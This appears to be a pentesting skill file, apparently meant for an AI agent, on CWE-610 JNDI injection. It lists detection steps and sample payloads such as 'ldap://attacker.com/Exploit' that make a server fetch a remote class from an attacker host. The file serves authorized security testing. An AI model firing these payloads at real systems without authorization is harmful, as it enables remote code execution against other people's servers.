
name: cwe-610-jndi-injection
description: Use when a web injection sink accepts CWE input.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-610, injection, a05, pentest, owasp]
category: pentesting-skills
related_skills:
  - owasp-a05-injection
---

# CWE-610 - JNDI Injection (LDAP/RMI/DNS lookup with user-controlled URL)

CWE-610: user input is used in a JNDI lookup (LDAP, RMI, DNS), allowing the attacker to control the lookup URL and load a malicious object or trigger a callback.

## Parent Skill

This is a sub-skill of `owasp-a05-injection` (OWASP A05 Injection, Top 10 2025).
Load the parent for overall A05 scope, the test procedure, and validation criteria
(negative control). This skill covers the CWE-610 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- When a parameter is used in a JNDI lookup (`InitialContext.lookup`, `ldap://`, `rmi://`, `dns://`) without validation.

## Detection & Test

1. **Find the JNDI sink.** Look for `InitialContext.lookup`, `Context.lookup`, or LDAP/RMI/DNS URL construction with user input.
2. **Inject a JNDI URL.** Send `ldap://attacker.com/Exploit` or `rmi://attacker.com:1099/Exploit` into the parameter.
3. **Confirm the lookup.** Verify the server attempts the JNDI lookup (out-of-band callback).
4. **Exploit the lookup.** If the lookup succeeds, load a malicious class or trigger a callback.
5. **Document the JNDI type, URL, and proof.

## Example Findings

- `InitialContext.lookup(user_input)` where input = `ldap://attacker.com/Exploit`.
- A logged exception message contains `rmi://attacker.com:1099/Exploit` that the stack resolves.

## Impact

- Data disclosure, logic manipulation, or code execution through the injection point.
- Privilege escalation or session hijack if the injection reaches auth/session logic.
- Persistence until the sink is parameterized or the input is validated.
- Lateral movement when the same unsanitized sink repeats across endpoints.

## See Also

- `owasp-a05-injection` - parent skill (A05 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).